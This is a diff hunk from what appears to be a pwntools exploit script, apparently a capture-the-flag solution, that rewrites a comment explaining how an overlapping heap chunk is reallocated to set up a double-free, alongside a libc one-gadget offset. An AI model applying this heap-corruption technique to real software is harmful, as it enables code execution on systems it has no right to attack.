@@ -52,9 +52,10 @@ def pwn():
 	magic       = libc + 0x4526a
 	
 	log.success('Libc: 0x{:x}'.format(libc))
-
-	# chunk #0 will be placed at different index in the ptr array
-	# enabling us to double-free it afterwards
+	
+	# Because of the overlap, the new allocation will practically
+	# allocate chunk #0 again and it will be placed at a different index
+	# inside the pointer array, enabling us to double-free it later on.
 	alloc(0x68, p64(0xb00bface))
 
 	# Trigger double-free
